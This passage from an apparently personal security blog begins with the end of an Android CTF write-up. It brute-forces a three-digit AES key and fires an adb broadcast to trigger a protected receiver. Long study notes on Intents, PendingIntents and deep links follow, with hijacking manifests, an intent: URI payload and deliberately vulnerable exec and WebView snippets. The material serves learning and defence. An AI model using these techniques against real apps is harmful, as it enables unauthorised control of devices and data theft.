base64.b64decode(cipherTxT) for pin in range(0,1000): real_pins = num_gen() key = generate_key(real_pins[pin]) cipher = AES.new(key, AES.MODE_ECB) try: decrypted = cipher.decrypt(ciphertext) decrypted = unpad(decrypted, AES.block_size) decrypted_str = decrypted.decode(\u0026#39;utf-8\u0026#39;) if decrypted_str == plaintext: print(f\u0026#34;\\nSUCCESS! Found PIN: {pin:03d}\u0026#34;) print(f\u0026#34;Decrypted text: \u0026#39;{decrypted_str}\u0026#39;\u0026#34;) print(f\u0026#34;Key used: {key.hex()}\u0026#34;) return pin except Exception as e: continue print(\u0026#34;\\nNo matching PIN found\u0026#34;) return None if __name__ == \u0026#34;__main__\u0026#34;: found_pin = decrypt(cipherTxT, PlainTxT) if found_pin is not None: print(\u0026#34;YaY\u0026#34;) i created the code so that if the pin changes to like 5 digits it will only need small edits and in the future i can add multi threading to speed things up\nAND guess what !\nSUCCESS! Found PIN: 345 Decrypted text: \u0026#39;master_on\u0026#39; Key used: 33343500000000000000000000000000 YaY now what was i doing again ???? oh yeah back to the receiver\nso i will try to send broadcast with\npin = 345 action = MASTER_ON (FYI i forgot since this a dynamically registered receiver i wont need to specify class and package \u0026hellip;. since the class name used didn\u0026rsquo;t even exist \u0026hellip;. and yes i did this lab at like 3am and i need to sleep )\nAnd since we don\u0026rsquo;t need to specify class we can just fire our Poc and see what happens\nIntent intent = new Intent(); intent.setAction(\u0026#34;MASTER_ON\u0026#34;); intent.putExtra(\u0026#34;key\u0026#34;, 345); sendBroadcast(intent); or adb\nadb shell am broadcast -a \u0026#34;MASTER_ON\u0026#34; --ei key 345 AAAAAAAAAAANd done using logcat to verify that we actually succeeded an no error occurred in the background is the best feeling in the world\n![[Pasted image 20250715045535.png]]\nNote: If you are in the setup activity (where you on/off things) the solution wont be applied to the UI unless you returned and clicked the button again\nThx for reading JOYBOY out\n","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/ctf/mobile/mobilehackinglab/iotconnect/iotconnect/","section":"","summary":"","title":"IOT Connect","type":"posts"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/","section":"JoyBoy","summary":"","title":"JoyBoy","type":"page"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/pending/","section":"Tags","summary":"","title":"Pending","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/tags/permissions/","section":"Tags","summary":"","title":"Permissions","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/tags/services/","section":"Tags","summary":"","title":"Services","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/tags/summary/","section":"Tags","summary":"","title":"Summary","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\rSummary #\rA way to express what you want from specific/special android components, sometimes you want to give it an ACTION or put some Extra data that it can read and interpret (understand) and don\u0026rsquo;t forget to that you can set class that you cant to talk to wither its in same app class or different app hence why it\u0026rsquo;s named intention i guess XD .\n[!Who can you send it to?]\nActivities: Sent to start new activities within your app or other apps installed on the user\u0026rsquo;s device. Services: Communicate with background services running in your app or other apps. Broadcast Receivers: Intents can be broadcast by the system (or an app) and received by appropriate components registered to handle those intents. Content Providers: Used to interact with content providers, which manage shared data between applications. Fragments: Intents can be sent to start new fragments within your app. Custom Components: You can create custom components (e.g., views, widgets) that respond to specific intent actions and categories What intent looks like #\rKey Attributes of an Intent #\rAn Intent object consists of several arguments that describe its purpose:\nIntent intent = new Intent(); intent.setAction(\u0026#34;android.intent.action.MAIN\u0026#34;); intent.setData(Uri.parse(\u0026#34;content://contacts/people/1\u0026#34;)); intent.setType(\u0026#34;text/plain\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.LAUNCHER\u0026#34;); intent.setComponent(new ComponentName(\u0026#34;com.example.package\u0026#34;, \u0026#34;com.example.package.MainActivity\u0026#34;)); intent.setClass(); intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent.putExtra(\u0026#34;EXTRA_KEY\u0026#34;, \u0026#34;Sample Value\u0026#34;); intent.putExtra(\u0026#34;ANOTHER_KEY\u0026#34;, 42); [!note] Important Categories\nDEFAULT category allows your app to respond to implicit intents Without DEFAULT, the activity can only be started with explicit component names [!Warning] You can only sent to any component (Implicit or Explicit) intent if it\u0026rsquo;s defined in the manifest file that exported its set to True\nTypes of Intent #\r1. Explicit #\rSending intent to a specific component\nspecify the exact Package (if in different app)\u0026amp; full class name of target and using setComponent() or setClass() Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;com.example\u0026#34;, \u0026#34;com.example.MyActivity\u0026#34;)); //or intent.setClass(\u0026#34;com.example\u0026#34;, \u0026#34;com.example.MyActivity\u0026#34;) startActivity(intent); 2. Implicit #\rwhen you don\u0026rsquo;t know exactly what component you want to interact with, and Android will handle the routing based on the intent Action\ndoes not fully specify the target component (by package and class name). Instead, it contains some data, often just an action (like ACTION_SEND), which allows the Android system to find a matching component to handle the intent (through filters). If multiple matching components are found, the user might be presented with a selection dialog\nUsing setAction() for setting an action string. // Setting action Intent intent = new Intent(); intent.setAction(\u0026#34;com.example.ACTION\u0026#34;); startActivity(intent); Corresponding Intent Filter in Manifest:\n\u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.ACTION\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; Risks (Implicit intent hijacking): #\rvulnerability where a malicious application can intercept and potentially take over an implicit intent meant for another application, this allows a malicious application to register an intent filter to intercept the intent instead of the intended application.\nDepending on the intent content, attackers could read or modify sensitive information or interact with mutable objects, such as mutable PendingIntents or Binders.\nMitigation : #\rUnless the application requires it, make intents explicit by calling setPackage(). This allows only by a specific component . preventing untrusted applications from intercepting the data sent along with the intent. The following snippet shows how to make an intent explicit:\nIntent intent = new Intent(\u0026#34;android.intent.action.CREATE_DOCUMENT\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.OPENABLE\u0026#34;); intent.setPackage(\u0026#34;com.some.packagename\u0026#34;); intent.setType(\u0026#34;*/*\u0026#34;); intent.putExtra(\u0026#34;android.intent.extra.LOCAL_ONLY\u0026#34;, true); intent.putExtra(\u0026#34;android.intent.extra.TITLE\u0026#34;, \u0026#34;Some Title\u0026#34;); startActivity(intent); for more go to [[Implicit intent hijacking]] more attacks\nIntent Attacks \u0026amp; Mitigation #\rImplicit Intent Hijacking #\r[!danger] Malicious applications can intercept implicit intents by registering matching intent filters, allowing them to read or modify sensitive information.\nAttack Scenarios:\nInsecure Broadcasts Messaging apps broadcasting implicitly can be intercepted All implicit broadcasts are delivered to every registered receiver across all apps Insecure Activity Launches Banking apps sharing credit card details via implicit intents Malicious apps can manipulate their position in Activity Chooser using android:priority Return Value Attacks (startActivityForResult()) Intercepting apps can use setResult() to return crafted data Commonly leads to arbitrary file/image theft Attackers return URIs pointing to private directory files File Overwrite Attacks Path-traversal characters in filenames (e.g., ../lib.so) Can lead to arbitrary code execution if files are written to critical locations The attacker can control the position of his app in the list using the android:priority=\u0026quot;num\u0026quot; attribute in the \u0026lt;intent-filter\u0026gt; declaration The attacker can thus intercept credit intent as follows\n\u0026lt;activity android:name=\u0026#34;.EvilActivity\u0026#34;\u0026gt; \u0026lt;intent-filter android:priority=\u0026#34;999\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;com.victim.ADD_CARD_ACTION\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent Redirection #\r[!danger] One app component receives an intent and forwards it to another component without proper validation.\nVulnerable Pattern:\nAttack Activity (malicious app) → Proxy Activity (vulnerable app) → Protected Target Activity Common Vulnerability:\n// Vulnerable code - no validation Parcelable extraIntent = getIntent().getParcelableExtra(\u0026#34;extra_intent\u0026#34;); if (extraIntent instanceof Intent) { startActivity((Intent) extraIntent); // Dangerous! } OR\nIntent intent = getIntent(); Intent nextIntent = (Intent) intent.getParcelableExtra(\u0026#34;nextIntent\u0026#34;); if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { startActivity(this.nextIntent); } That can lead to :\nOpen Redirect - Malicious URLs routed through proxy Local File Inclusion (LFI) - Access to local files if WebView has universal access enabled Protected FileProvider Access - Access non-exported ContentProviders mitigation #\r1. Validate Intent Destinations #\rverify where intents are being redirected before forwarding them:\nIntent intent = getIntent(); // Get the component name of the nested intent Intent forward = (Intent) intent.getParcelableExtra(\u0026#34;key\u0026#34;); ComponentName name = forward.resolveActivity(getPackageManager()); // Check that the package name and class name contain the expected values if (name.getPackageName().equals(\u0026#34;safe_package\u0026#34;) \u0026amp;\u0026amp; name.getClassName().equals(\u0026#34;safe_class\u0026#34;)) { // Redirect the nested intent startActivity(forward); } 2. Use Pending Intent Objects #\rPending Intents prevent component export and make target actions immutable to send intents that can\u0026rsquo;t be tampered with\n// Create immutable PendingIntent PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE ); // Ensure explicit component targeting Intent intent = new Intent(intentAction); intent.setClassName(packageName, className); PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, intent, PendingIntent.FLAG_IMMUTABLE ); 3. Implement IntentSanitizer #\rUse IntentSanitizer to create sanitized copies of intents with allowlisted components and data:\nIntent sanitizedIntent = new IntentSanitizer.Builder() .allowComponent(\u0026#34;com.example.ActivityA\u0026#34;) .allowData(\u0026#34;com.example\u0026#34;) .allowType(\u0026#34;text/plain\u0026#34;) .build() .sanitizeByThrowing(intent); 4. Explicit Intent Usage #\rUse explicit intents for sensitive operations to control component targeting:\nIntent intent = new Intent(\u0026#34;android.intent.action.CREATE_DOCUMENT\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.OPENABLE\u0026#34;); intent.setPackage(\u0026#34;com.some.packagename\u0026#34;); // Explicitly set package intent.setType(\u0026#34;*/*\u0026#34;); startActivity(intent); 5. Dynamic determination of intent receivers #\rSome apps try to stop the activity picker appearing by automatically determining a single recipient and setting it in the intent settings (which is also very common when launching services, since implicit intents are forbidden in service launch)\nIntent intent = new Intent(\u0026#34;com.victim.ADD_CARD_ACTION\u0026#34;); intent.putExtra(\u0026#34;credit_card_number\u0026#34;, num.getText().toString()); intent.putExtra(\u0026#34;holder_name\u0026#34;, name.getText().toString()); //... for (ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) { intent.setClassName(info.activityInfo.packageName, info.activityInfo.name); startActivity(intent); return; } this is more advantageous, because it eliminates the need for user interaction and automatically specifies the attacker’s activity\n6. Minimize component exposure and implement proper permissions: #\r\u0026lt;!-- Avoid exporting components unless necessary --\u0026gt; \u0026lt;activity android:name=\u0026#34;.MyActivity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; // Enforce permissions at code level public class MyExportService extends Service { @Override public IBinder onBind(Intent intent) { enforceCallingPermission(Manifest.permission.READ_CONTACTS, \u0026#34;Calling app doesn\u0026#39;t have READ_CONTACTS permission.\u0026#34;); return binder; } } Receiving Intent Results #\rgetIntent() #\rIntent recivedIntent = getIntent(); String action = recivedIntent.getAction(); // now access it //to return a result when using onActivityResult recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish(); Legacy: onActivityResult() #\rIntent intent = new Intent(this, MessageActivity.class); intent.putExtra(EXTRA_MESSAGE, message); startActivityForResult(intent, ACTIVITY_ID01); @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == ACTIVITY_ID01) { // Process data from activity 1 if (resultCode == RESULT_OK \u0026amp;\u0026amp; data != null) { String token = data.getStringExtra(\u0026#34;token\u0026#34;); // Handle result } } } Modern: registerForActivityResult() #\rActivityResultLauncher\u0026lt;Intent\u0026gt; activityLauncher = registerForActivityResult( new ActivityResultContracts.StartActivityForResult(), result -\u0026gt; { if (result.getResultCode() == RESULT_OK) { Intent data = result.getData(); if (data != null) { // Process result data String token = data.getStringExtra(\u0026#34;token\u0026#34;); } } } ); // Launch activity Intent intent = new Intent(this, TargetActivity.class); activityLauncher.launch(intent); Returning Results #\r// In the called activity Intent resultIntent = getIntent(); resultIntent.putExtra(\u0026#34;token\u0026#34;, \u0026#34;1094795585\u0026#34;); setResult(RESULT_OK, resultIntent); finish(); PendingIntents #\r[!info] Definition: A PendingIntent allows one application to grant another application permission to execute a predefined action on its behalf, even if the creator app is no longer running.\nIt\u0026rsquo;s often used in scenarios where you want to allow an action to be performed in the future, even if your application is not running.\nHence PendingIntent can be used with different components using methods like :\nPendingIntent.getActivity() : Retrieve a PendingIntent to start an Activity PendingIntent.getBroadcast() : Retrieve a PendingIntent to perform a Broadcast PendingIntent.getService() : Retrieve a PendingIntent to start a Service [!example] Example Imagine that you have a non exported activity A which can be launched from your own application’s activities. You want though other applications to be able to call A under specific conditions. This is where the pending intent comes to place. The idea is to wrap a normal intent (base intent) that you would use to start activity A into an object, send this object to the other application and let the other application to unwrap the intent and send it back to activity A. Dimitrios Valsamaras (+Chopin) : Pending Intents: A Pentester’s view\nCode Example:\nYou want to show a notification, and when the user clicks it, it opens a NonExportedActivity within your app using a PendingIntent.\n// Step 1: Create base Intent for non-exported activity Intent intent = new Intent(this, NonExportedActivity.class); intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;Hello from PendingIntent!\u0026#34;); // Step 2: Wrap Intent in PendingIntent with security flags PendingIntent pendingIntent = PendingIntent.getActivity( this, // Context 0, // requestCode intent, // Base Intent PendingIntent.FLAG_IMMUTABLE // Security flag ); // Step 3: Use in notification NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId) .setSmallIcon(R.drawable.ic_launcher_foreground) .setContentTitle(\u0026#34;PendingIntent Demo\u0026#34;) .setContentText(\u0026#34;Click to launch NonExportedActivity\u0026#34;) .setAutoCancel(true) .setContentIntent(pendingIntent); // Attach PendingIntent notificationManager.notify(1, builder.build()); NonExportedActivity.java\nString msg = getIntent().getStringExtra(\u0026#34;msg\u0026#34;); TextView textView = findViewById(R.id.textView); textView.setText(msg); PendingIntent Flags\nFlag Value Description FLAG_MUTABLE 33554432 Allows intent data/extras to be changed FLAG_IMMUTABLE 67108864 Locks intent - recommended for security FLAG_ONE_SHOT - Prevents replay attacks How to create a pending intent #\rEach section focuses on a specific functionality or use case, making the code easier to understand and maintain. The methods are separated logically, and related functionality is grouped together.\n1. Creating Activity PendingIntent #\r// Method to create a PendingIntent for starting an Activity private PendingIntent createActivityPendingIntent() { // Step 1: Create the base Intent with explicit component Intent baseIntent = new Intent(\u0026#34;My.Action\u0026#34;); baseIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.TargetActivity\u0026#34;); // Step 2: Create PendingIntent with FLAG_IMMUTABLE for security return PendingIntent.getActivity( this, // Context 0, // Request code baseIntent, // Base Intent PendingIntent.FLAG_IMMUTABLE // Security flag ); } 2. Creating Service PendingIntent #\r// Method to create a PendingIntent for a Service private PendingIntent createServicePendingIntent() { Intent serviceIntent = new Intent(\u0026#34;My.Service.Action\u0026#34;); serviceIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MyService\u0026#34;); return PendingIntent.getService( this, 0, serviceIntent, PendingIntent.FLAG_IMMUTABLE ); } 3. Creating Broadcast PendingIntent #\r// Method to create a PendingIntent for a Broadcast private PendingIntent createBroadcastPendingIntent() { Intent broadcastIntent = new Intent(\u0026#34;My.Broadcast.Action\u0026#34;); broadcastIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MyBroadcastReceiver\u0026#34;); return PendingIntent.getBroadcast( this, 0, broadcastIntent, PendingIntent.FLAG_IMMUTABLE ); } 4. Creating One-Shot PendingIntent #\r// Method to create a one-shot PendingIntent (can only be used once) private PendingIntent createOneShotPendingIntent() { Intent intent = new Intent(\u0026#34;My.OneShot.Action\u0026#34;); intent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.OneShotActivity\u0026#34;); return PendingIntent.getActivity( this, 0, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT ); } 5. Sending PendingIntent to Another App #\r// Method to send PendingIntent to another app private void sendPendingIntentToAnotherApp() { // Create the PendingIntent PendingIntent pendingIntent = createActivityPendingIntent(); // Create Intent to target another app Intent targetAppIntent = new Intent(); targetAppIntent.setClassName(\u0026#34;com.example.otherapp\u0026#34;, \u0026#34;com.example.otherapp.ReceiverActivity\u0026#34;); // Add PendingIntent as extra targetAppIntent.putExtra(\u0026#34;pendingIntent\u0026#34;, pendingIntent); // Start the other app\u0026#39;s activity startActivity(targetAppIntent); } 6. Using PendingIntent with Notification #\r// Method to use PendingIntent with NotificationManager (common use case) private void createNotificationWithPendingIntent() { // Create PendingIntent PendingIntent pendingIntent = createActivityPendingIntent(); // Create notification with PendingIntent NotificationCompat.Builder builder = new NotificationCompat.Builder(this, \u0026#34;channel_id\u0026#34;) .setSmallIcon(R.drawable.ic_notification) .setContentTitle(\u0026#34;My Notification\u0026#34;) .setContentText(\u0026#34;Click to open activity\u0026#34;) .setContentIntent(pendingIntent) // Set the PendingIntent .setAutoCancel(true); NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE); notificationManager.notify(1, builder.build()); } 7. Using PendingIntent with AlarmManager #\r// Method to use PendingIntent with AlarmManager private void scheduleAlarmWithPendingIntent() { // Create PendingIntent for broadcast PendingIntent alarmIntent = createBroadcastPendingIntent(); // Schedule alarm AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE); long triggerTime = System.currentTimeMillis() + 60000; // 1 minute from now alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, alarmIntent); } 8. Receiver Activity (Separate Class) #\r// Example of receiving and using a PendingIntent in another app public class ReceiverActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_receiver); // Retrieve PendingIntent from the Intent extras Intent intent = getIntent(); PendingIntent receivedPendingIntent = intent.getParcelableExtra(\u0026#34;pendingIntent\u0026#34;); if (receivedPendingIntent != null) { try { // Send/execute the PendingIntent receivedPendingIntent.send(); } catch (PendingIntent.CanceledException e) { Log.e(\u0026#34;ReceiverActivity\u0026#34;, \u0026#34;PendingIntent was cancelled\u0026#34;, e); } } } } 9. Mutable PendingIntent Example (Separate Class) #\r// Example with mutable PendingIntent (use with caution) public class MutablePendingIntentExample { private PendingIntent createMutablePendingIntent(Context context) { Intent baseIntent = new Intent(\u0026#34;My.Mutable.Action\u0026#34;); baseIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MutableActivity\u0026#34;); // Only use FLAG_MUTABLE when absolutely necessary return PendingIntent.getActivity( context, 0, baseIntent, PendingIntent.FLAG_MUTABLE // Use with extreme caution ); } } Pending Intent Attacks \u0026amp; Mitigations #\rMutable PendingIntents #\r[!danger] By default, PendingIntents were historically mutable (until Android R). Malicious apps can modify the inner Intent, potentially accessing non-exported components.\nAttack Scenarios:\nNotification Hijack Malicious app with notification listener permission fetches PendingIntent Modifies Intent to launch attacker\u0026rsquo;s activity with victim\u0026rsquo;s permissions Permission Escalation App A has READ_CONTACTS permission, creates mutable PendingIntent App B modifies Intent to read contacts without having the permission Replay Attacks #\r[!danger] Risk\nPendingIntents can be replayed unless FLAG_ONE_SHOT is set, allowing malicious apps to repeat actions multiple times.\nMitigation #\r1. Set Explicit Components #\rIntent intent = new Intent(intentAction); // Explicitly set component to prevent redirection intent.setClassName(packageName, className); PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, intent, PendingIntent.FLAG_IMMUTABLE ); 2. Use FLAG_IMMUTABLE #\rIf your app targets Android 6 (API level 23) or higher, specify mutability.\n// For Android 6+ (API 23), strongly recommended // For Android 11+ (API 30), mutability must be specified PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE ); 3. Prevent Replay Attacks #\r// For one-time actions PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT ); [!warning] Critical Security Rule Always ensure the base Intent wrapped in PendingIntent has the component name explicitly set to one of your own components.\nDeep Links #\r[!info] A deep link is ==a special type of hyperlink that allows users to navigate directly to a specific page or content within an app, bypassing the app\u0026rsquo;s homepage==. This is done by declaring what the component will accepts through it\u0026rsquo;s filters\nHow Deep Links Work #\r![[Pasted image 20250713181259.png]]\nFor an application to handle deep links it requires:\nIntent Filter Required - Activity must have intent filter in AndroidManifest.xml Exported Activity - Must be explicitly exported (android:exported=\u0026quot;true\u0026quot;) URI Scheme Definition - Specify scheme, host, and path in \u0026lt;data\u0026gt; tag In Details:\nThe action need to be action.VIEW\nCategory\nDEFALUT : to handle implicit intents without specifying the component name BROWSABLE : allow browsers to open the link in your app. Data:\nDefine the URI format with at least android:scheme Optionally use android:path, pathPrefix, or pathPattern to refine which URIs open this activity. (if no data is set ) : The Chrome intent: scheme solves this by allowing a site to create explicit intents Chrome on Android implements a custom scheme intent: with a lot more features than the regular deep links. Which make them very useful for an attacker.\nintent: features:\nIt\u0026rsquo;s a generic intent Control the action and category Target specific app and class Add extra values Deep Link Manifest Example #\r[!warning] Intent Filter Separation Create separate intent filters for different URL schemes. Multiple \u0026lt;data\u0026gt; elements in the same filter can create unintended combinations.\nThe following XML snippet shows an intent filter deep linking. The URIs “example://gizmos” and “http://www.example.com/gizmos” both resolve to this activity.\n\u0026lt;activity android:name=\u0026#34;com.example.android.GizmosActivity\u0026#34; android:label=\u0026#34;@string/title_gizmos\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter android:label=\u0026#34;@string/filter_view_http_gizmos\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;!-- HTTP/HTTPS deep link --\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34; android:host=\u0026#34;www.example.com\u0026#34; android:pathPrefix=\u0026#34;/gizmos\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter android:label=\u0026#34;@string/filter_view_example_gizmos\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;!-- Custom scheme deep link --\u0026gt; \u0026lt;data android:scheme=\u0026#34;example\u0026#34; android:host=\u0026#34;gizmos\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; But what will happen if we didn\u0026rsquo;t separate the data? Although it\u0026rsquo;s possible to include multiple \u0026lt;data\u0026gt; elements in the same filter, it\u0026rsquo;s important that you create separate filters when your intention is to declare unique URLs\nProblem Example:\n\u0026lt;!-- DON\u0026#39;T DO THIS - Creates unintended combinations --\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;www.example.com\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;app\u0026#34; android:host=\u0026#34;open.my.app\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;!-- This accepts: https://www.example.com, app://open.my.app --\u0026gt; \u0026lt;!-- But also: app://www.example.com, https://open.my.app --\u0026gt; It might seem as though this supports only https://www.example.com and app://open.my.app. However, it actually supports those two, plus these: app://www.example.com and https://open.my.app thus adding more attack vectors\nTypes of Deep Links #\r1. General Deep Links #\rDefinition: URIs of any scheme (geo:, example://, vaadata://) Behavior: May trigger disambiguation dialog if multiple apps can handle the URI Implementation: Requires standard intent filter with VIEW action, DEFAULT and BROWSABLE categories 2. Web Links #\rDefinition: Deep links specifically using HTTP and HTTPS schemes Behavior: Android 12+: Always show in browser by default unless app is domain-approved Earlier versions: May show disambiguation dialog Implementation: Same as general deep links but with http/https schemes 3. Android App Links #\rDefinition: Web links with android:autoVerify=\u0026quot;true\u0026quot; (Android 6.0+ API 23+) Behavior: Open immediately if app is verified default handler, bypassing disambiguation Requirements: HTTP/HTTPS schemes only Domain ownership verification required assetlinks.json file on web server Android App Links Implementation #\rStep 1: Create Intent Filters #\r\u0026lt;intent-filter android:autoVerify=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;yourdomain.com\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; Step 2: Digital Asset Links File #\rHost assetlinks.json at https://yourdomain.com/.well-known/assetlinks.json:\n[{ \u0026#34;relation\u0026#34;: [\u0026#34;delegate_permission/common.handle_all_urls\u0026#34;], \u0026#34;target\u0026#34;: { \u0026#34;namespace\u0026#34;: \u0026#34;android_app\u0026#34;, \u0026#34;package_name\u0026#34;: \u0026#34;com.example.yourapp\u0026#34;, \u0026#34;sha256_cert_fingerprints\u0026#34;: [\u0026#34;14:6D:E9:83:C5:73:06:50:D8:EE:B9:95:2F:34:FC:64:16:A0:83:42:E6:1D:BE:A8:8A:04:96:B2:3F:CF:44:E5\u0026#34;] } }] Reading Deep Link Data #\r@Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); Intent intent = getIntent(); String action = intent.getAction(); Uri data = intent.getData(); // Use \u0026#39;data\u0026#39; and \u0026#39;action\u0026#39; to render appropriate content if (Intent.ACTION_VIEW.equals(action) \u0026amp;\u0026amp; data != null) { // Handle deep link data String scheme = data.getScheme(); String host = data.getHost(); String path = data.getPath(); // Process the URI safely } } Risk \u0026amp; Impact #\rThe security risks associated with deep links stem from their core capability of enabling seamless navigation and interaction within mobile applications. Deep link vulnerabilities arise from weaknesses in the implementation or handling of deep links.\nThey can be hijacked like any other implicit intent if the \u0026lt;intent-filter\u0026gt; are properly setup\nThe lack of a proper deep link validation mechanism, or the unsafe use of deeplinks, can aid malicious users in performing attacks such as host validation bypass, cross-app scripting, and remote code execution within the permissions context of the vulnerable application. Depending on the nature of the application, this can result in unauthorized access to sensitive data or functions. (Developer Docs)\nAn example is some in-app navigation that uses deep links which expose and increase attack surface\nDeep Link Vulnerabilities \u0026amp; Attacks #\r[!warning] The lack of a proper deep link validation mechanism, or the unsafe use of deeplinks, can aid malicious users in performing attacks such as host validation bypass, cross-app scripting, and remote code execution within the permissions context of the vulnerable application. Depending on the nature of the application, this can result in unauthorized access to sensitive data or functions. (Developer Docs)\nThey can be hijacked like any other implicit intent if the \u0026lt;intent-filter\u0026gt; are properly setup\nSensitive Data Transfer #\r[!danger] Malicious applications can register intent filters for the same deep links and intercept sensitive data.\nImpact: Account takeover, credential theft, sensitive information exposure\nParameter Injection Attacks #\r[!danger] Common Vulnerabilities\nCross-Site Scripting (XSS)\n// Vulnerable code String url = getIntent().getData().getQueryParameter(\u0026#34;url\u0026#34;); webView.loadUrl(url); // No validation! Remote Code Execution (RCE)\n// Dangerous - parameter passed to exec String command = getIntent().getData().getQueryParameter(\u0026#34;cmd\u0026#34;); Runtime.getRuntime().exec(command); Path Traversal\n// Vulnerable to ../../../sensitive_file String filename = getIntent().getData().getQueryParameter(\u0026#34;file\u0026#34;); File file = new File(\u0026#34;/app/files/\u0026#34; + filename); WebView-Specific Attacks #\r[!danger] WebView Vulnerabilities\nArbitrary URL Loading\nStealing authentication tokens Loading malicious content JavaScript Injection\n// Vulnerable concatenation String userInput = getIntent().getData().getQueryParameter(\u0026#34;data\u0026#34;); webView.loadUrl(\u0026#34;javascript:processData(\u0026#39;\u0026#34; + userInput + \u0026#34;\u0026#39;)\u0026#34;); File Access Attacks\nsetAllowFileAccessFromFileURLs(true) enables local file reading setAllowUniversalAccessFromFileURLs(true) allows cross-origin requests JavaScript Interface Exploitation\n// Exposing sensitive methods webView.addJavascriptInterface(new SensitiveAPI(), \u0026#34;Android\u0026#34;); Chrome Intent Scheme Exploitation #\rChrome\u0026rsquo;s intent: scheme provides more control than regular deep links:\nintent://example.com/path#Intent;\raction=android.intent.action.VIEW;\rcategory=android.intent.category.BROWSABLE;\rcomponent=com.victim.app/.VulnerableActivity;\rS.extra_data=malicious_payload;\rend; Deep Link Security Mitigations #\r1. Use Android App Links #\rRequires domain ownership verification Prevents other apps from intercepting your links Uses only HTTP/HTTPS (no custom schemes) \u0026lt;!-- App Links configuration --\u0026gt; \u0026lt;intent-filter 